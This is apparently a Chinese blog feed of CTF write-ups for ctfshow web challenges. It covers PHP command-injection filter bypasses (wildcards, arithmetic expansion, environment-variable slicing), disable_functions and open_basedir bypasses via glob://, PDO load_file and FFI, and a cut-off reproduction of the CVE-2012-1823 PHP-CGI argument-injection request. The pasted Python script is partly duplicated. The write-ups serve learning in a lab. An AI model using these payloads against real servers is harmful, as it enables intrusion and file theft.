        <content type="html"><![CDATA[<h2 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>题目为上；<br> 1、用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        breakimport requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>2、使用/bin这个目录：<br>       bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等<br>       这题利用/bin/base64<br>base64这个命令就是将指定的文件的内容以base64加密的形式输出。<br>因为过滤了字母，正好可以用64来匹配，最终payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure><h2 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>题目如上；<br>同55一样运用/bin目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于/bin上拥有cat，因此用/bin/cat flag.php;便可查找flag。</span><br></pre></td></tr></table></figure><p>由于cat flag . php 被过滤则<br>使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h2 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h2><p>disable_functions函数启动后会禁止一些函数使得一些命令无法使用。<br>又是新姿势，知识点是$(( ))与整数运算。想办法构造出36.<br>双小括号的作用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。</span><br><span class="line">通俗地讲，就是将数学运算表达式放在((和))之间。</span><br><span class="line"></span><br><span class="line">表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</span><br><span class="line"></span><br><span class="line">可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</span><br><span class="line"></span><br><span class="line">可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</span><br></pre></td></tr></table></figure><p>大佬曾说：关于取反，根据我学习下来得到的经验就是如果b=<del>a，那么a+b=-1<br>注意：$(())的值是0。$((</del>$(())))的值是-1。$((     $((<del>$(())))       $((</del>$(())))        ))  是-2;<br>则我们可以看出来<br>-2的构成是由两个-1相加得来的且内部也是默认相加；（因此36则需要-37来取反 //说实话没看懂；）<br>因此则需要三十七个$((<del>$(()))) ，之后在取反，取反看大佬说是$((</del>$(( ))))。<br>因此：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))</span><br></pre></td></tr></table></figure><h2 id="web-58-65"><a href="#web-58-65" class="headerlink" title="web 58~65"></a>web 58~65</h2><p>  读文件的函数有这些：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure><p>fgets()函数使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  c=</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$b</span>=fgets(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后蚁剑连接。（我也不知道是什么情况😂）</p><h2 id="web-66"><a href="#web-66" class="headerlink" title="web 66"></a>web 66</h2><p>（该题的flag在根目录下，html下的flag.php是假的）我们看到假的后可以用下面方法打开。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">highlight_file(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本题的print_r（）被禁</span><br><span class="line">可以用var_dump()来绕过。</span><br></pre></td></tr></table></figure><h2 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()被过滤，但是<span class="keyword">include</span>却没有被ban因此可以用文件包含。</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69~70"></a>web 69~70</h2><p>如果var_dump被ban就使用var_export()来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="web-70"><a href="#web-70" class="headerlink" title="web 70"></a>web 70</h2><p>题目源码（在附件中）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();<span class="comment">////得到缓冲区的数据</span></span><br><span class="line">        ob_end_clean();<span class="comment">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span></span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>（缓冲区：缓冲区又称为缓存，它是内存空间的一部分。<br>也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>   缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>    比如我们从磁盘里取信息，我们先把读出的数据放在缓冲区，<br>计算机再直接从缓冲区中取数据，等缓冲区的数据取完后再去磁盘中读取，<br>这样就可以减少磁盘的读写次数，<br>再加上计算机对缓冲区的操作大大快于对磁盘的操作，故应用缓冲区可大大提高计算机的运行速度。）<br><strong>本题是在我们输入命令后输出时对输出数据先进行缓存，缓存的数据通过preg_replace()将字母和数字都给替换为？，使得我们无法正常查看。</strong><br>使用exit()/die()提前结束，这样就不会将字符替换为问号（在我看来，应该是没有进行下面的得到缓存区数据的代码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>web72 不会</p><h2 id="web-73、74"><a href="#web-73、74" class="headerlink" title="web 73、74"></a>web 73、74</h2><p>无源码，可根据71、72来做。<br>其他大佬都说存在open_basedir函数，因此可以利用glob伪协议来筛选目录。<br>glob伪协议：glob:// — 查找匹配的文件路径模式<br>本题代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">   <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后可以查找到flagc.txt文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>即可得到。</p><h2 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75~76"></a>web 75~76</h2><p>和上题一样，通过上题脚本可以看到flag实在flag36.txt中，但之后是由include()函数去报错，之后发现是open_basedir影响使得路径受到限制，不懂,看到大佬wp发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>);<span class="comment">//连接数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]) . <span class="string">&quot;|&quot;</span>;<span class="comment">//query()执行查询语句，返回结果集对象，从中可以看出该段代码是将flag36.txt内容传到$row中，并输出。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="comment">//回显错误信息。</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//PDOException是错误异常。</span></span><br></pre></td></tr></table></figure><p>大师傅们说数据库的连接是读配置文件得到的。至于配置文件在哪。。鬼知道。。。<br>不过这种拿SQL语句来读文件绕过open_basedir和disable_function的姿势实在是第一次见，学到了学到了。</p><p>PDO<br>PDO()就是PHP data Object 提供了PHP操作多种数据库的统一的接口,使用的主要思路：<br>1、添加<br>      （1）连接数据库、数据库的用户名、数据库的密码<br>                                         （2）生成PDO对象<br>                                         （3）执行添加 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的用户名</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的密码</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//生成PDO对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="comment">//执行添加</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into student(`name`,`sex`,`sex`) values(&#x27;zhangsan&#x27;,&#x27;男&#x27;,&#x27;18&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$object</span>-&gt;exec(<span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;添加成功&#x27;</span>;</span><br><span class="line">&#125;<span class="comment">//exec主要用于执行没有返回结果集的操作，比如insert、delete、update，返回的是影响的记录条数</span></span><br></pre></td></tr></table></figure><p>2、查询<br> 主要思路：<br>                                         （1）连接数据库、数据库的用户名、数据库的密码<br>                                         （2）生成PDO对象<br>                                         （3）执行查询 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的用户名</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的密码</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//生成PDO对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from student&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$object</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$arr</span>=<span class="variable">$result</span>-&gt;fetch())&#123;</span><br><span class="line">    print_r(<span class="variable">$arr</span>);</span><br><span class="line">&#125;<span class="comment">//用循环利用fetch()方法逐个的取出记录，返回的是关联数组和索引数组两种数组，和mysql_fetch_array()的返回结果一致</span></span><br></pre></td></tr></table></figure><p>还可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>=<span class="variable">$result</span>-&gt;fetchAll();<span class="comment">//fetchAll()方法可以一次取出结果集中所有的数组，以二维数组的形式返回，但仍然是关联数组和索引数组两种数组</span></span><br><span class="line">print_r(<span class="variable">$student_info</span>);</span><br></pre></td></tr></table></figure><h2 id="web-77"><a href="#web-77" class="headerlink" title="web 77"></a>web 77</h2><p>通过该题，我们可以在开始的提示中看到PHP7.4，从而可以想到FFI（虽然我也不知道如何想到的，但我们应该知道FFI为PHP7.4核心拓展。</p><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p></blockquote><p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先是熟悉的确定flag位置和名称</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;  &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FFI调用system函数</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI :: cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WEB118"><a href="#WEB118" class="headerlink" title="WEB118"></a>WEB118</h2><p>拿到题一脸懵，不知道该干啥，看源码知道?code，看大佬wp发现好东西</p><blockquote><p>root@baba:<del># echo ${PWD}<br>/root<br>root@baba:</del># echo ${PWD:1:1}   //表示从第2（1+1）个字符开始的一个字符<br>r<br>root@baba:<del># echo ${PWD:0:1}   //表示从第1（0+1）个字符开始的一个字符<br>/<br>root@baba:</del># echo ${PWD:<del>0:1}  //表示从最后一个字符开始的一个字符<br>t<br>root@baba:</del># echo ${PWD:~A}    //字母代表0<br>t</p></blockquote><p>利用各种环境变量来构造命令<br>首先需要知道${PWD}：看当前路径<br>${PATH}通常为bin<br>通过上面的规则来构造命令（若看不懂可以看Linux 基础知识：Bash的内置变量<br>常见 Bash 内置变量介绍）<br>由于通配符没有被过滤，则构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br><span class="line"><span class="comment">//在看源码就可以看到flag</span></span><br></pre></td></tr></table></figure><h2 id="web119-120"><a href="#web119-120" class="headerlink" title="web119~120"></a>web119~120</h2><p>比上题多过滤了path。</p><blockquote><p>SHLVL：是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。<br>RANDOM：此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。<br>在Linux中，$或$</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2012-1823</title>
      <link href="/2022/01/07/CVE-2012-1823/"/>
      <url>/2022/01/07/CVE-2012-1823/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1717894">CVE-2012-1823详细介绍</a><br>漏洞复现（靶场为ctfshow）<br>利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//url/index.php?-s</span></span><br></pre></td></tr></table></figure><p>判断是否存在漏洞<br>若出现源码组存在<br>bp抓包按下面修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input HTTP/1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span 